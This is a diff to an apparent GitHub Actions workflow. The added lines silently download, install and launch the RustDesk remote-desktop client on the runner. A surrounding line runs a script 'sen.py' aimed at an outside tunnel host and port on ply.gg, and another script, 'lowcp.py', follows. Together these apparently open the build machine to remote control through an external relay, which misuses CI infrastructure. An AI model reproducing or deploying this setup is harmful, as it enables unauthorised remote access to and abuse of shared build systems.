@@ -57,4 +57,22 @@ jobs:
           # Output the file path for verification
           $screenshotPath
           
+          echo installing flask
+          pip install Flask
+          echo installing the rustdesk
+          $Url = "https://github.com/rustdesk/rustdesk/releases/download/1.3.1/rustdesk-1.3.1-x86_64.msi"
+          $Output = ".\rustdesk-1.3.1-x86_64.msi"  # Saves in the current directory
+          
+          # Download the MSI file
+          Invoke-WebRequest -Uri $Url -OutFile $Output
+          
+          # Run the MSI installer in silent mode
+          Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$Output`" /quiet" -Wait
+          echo listing the files
+          ls
+          echo running the rustdesk
+          Start-Process "C:\Program Files\RustDesk\rustdesk.exe"
+          echo clicking the image
           python sen.py means-courtesy.gl.at.ply.gg 9326
+          echo running the low cp
+          python lowcp.py
